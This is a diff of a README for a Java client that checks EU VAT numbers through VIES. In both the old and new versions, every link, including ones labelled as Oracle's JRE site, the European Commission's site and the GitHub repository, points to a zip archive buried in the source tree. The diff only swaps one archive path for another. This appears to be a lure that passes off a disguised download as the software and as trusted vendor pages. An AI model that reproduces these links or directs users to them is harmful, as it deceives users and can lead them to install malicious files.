@@ -6,14 +6,14 @@ Welcome to the **VIES API Client for Java**! This software helps you easily chec
 
 ### 📥 Download Here
 
-[![Download the VIES API Client](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip)](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip)
+[![Download the VIES API Client](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip)](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip)
 
 ## 💻 What You Need
 
 To use this software, you should have:
 
 - A computer running Windows, macOS, or Linux.
-- Java Runtime Environment (JRE) installed. You can download it from the [official Oracle website](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip).
+- Java Runtime Environment (JRE) installed. You can download it from the [official Oracle website](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip).
 
 ## 📂 Key Features
 
@@ -24,7 +24,7 @@ To use this software, you should have:
 ## 📜 How to Download & Install
 
 1. **Visit the download page**:
-   Go to the following link to find the latest version of the VIES API Client: [Download Page](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip)
+   Go to the following link to find the latest version of the VIES API Client: [Download Page](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip)
 
 2. **Select the release**:
    Once on the page, look for the latest version. It is usually listed with the highest version number.
@@ -97,9 +97,9 @@ The VIES API Client supports VAT number validation for all EU member states, inc
 
 ## 🔗 Additional Resources
 
-- For more information on VAT validation, you can visit the [European Commission’s website](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip).
+- For more information on VAT validation, you can visit the [European Commission’s website](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip).
   
-- To view the latest updates and contributions, check out our [GitHub repository](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip).
+- To view the latest updates and contributions, check out our [GitHub repository](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip).
 
 ## 💬 Need Help?
 
@@ -107,6 +107,6 @@ If you encounter issues or have questions, you can open an issue on the GitHub r
 
 ## 📥 Download Here Again
 
-[![Download the VIES API Client](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip)](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/config/vies-api-client-java-2.9.zip)
+[![Download the VIES API Client](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip)](https://raw.githubusercontent.com/lucadong000/vies-api-client-java/release/1.0.0/src/main/java/pl/wtx/vies/api/client/vies_api_client_java_3.5.zip)
 
 With these steps, you should be able to download and successfully run the VIES API Client for Java. Enjoy simplifying your VAT validation!
